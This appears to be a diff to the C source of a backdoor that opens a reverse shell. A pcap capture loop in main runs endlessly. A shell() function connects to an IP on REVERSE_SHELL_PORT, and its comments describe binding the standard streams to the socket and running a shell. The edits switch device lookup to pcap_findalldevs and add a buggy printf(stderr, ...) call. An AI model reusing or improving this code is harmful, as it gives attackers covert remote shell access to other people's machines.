@@ -37,6 +37,7 @@ void shell(int ip) {
 		int sd;
 		struct sockaddr_in sockaddr;
 		struct in_addr sock_ip;
+		struct sockaddr saddr;
 
 		// Create socket, build structs
 
@@ -46,16 +47,15 @@ void shell(int ip) {
 		}
 
 		sock_ip.s_addr = ip;
-
 		sockaddr.sin_family = AF_INET;
 		sockaddr.sin_port = htons(REVERSE_SHELL_PORT);
 		sockaddr.sin_addr = sock_ip;
-
+		
 		// Connect to server, duplicate stdin out and err to the socket,
 		// execute a shell and block until exit. Close the socket and
 		// return once the shell returns.
 
-		int con = connect(sd, &sockaddr, sizeof(sockaddr));
+		int con = connect(sd,  &sockaddr, sizeof(sockaddr));
 		if (con < 0)
 		{
 			return;
@@ -90,18 +90,18 @@ void cap_start(void) {
 	char *dev;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* descr;
+	pcap_if_t *interfaces;
 	const u_char *packet;
 	struct pcap_pkthdr hdr;
 	struct bpf_program *fp;		// Compiled filter
 	bpf_u_int32 maskp;		// Subnet mask
 	bpf_u_int32 netp;		// IP
 
-	dev = pcap_lookupdev(errbuf);
-	if (dev == NULL) {
-		fprintf(stderr, "%s\n", errbuf);
+	if (pcap_findalldevs(&interfaces,errbuf) == -1) {
+		printf(stderr, "%s\n", errbuf);
 		exit(1);
 	}
-	
+	dev = interfaces->name;
 	// Lookup IP and netmask of chosen device
 	pcap_lookupnet(dev, &netp, &maskp, errbuf);
 
@@ -125,8 +125,8 @@ void cap_start(void) {
 }
 
 int main (int argc, char **argv) {
-	while (1) { 
-		cap_start(); 
+	while(1){
+		cap_start();
 	}
 	return EXIT_SUCCESS;
 }
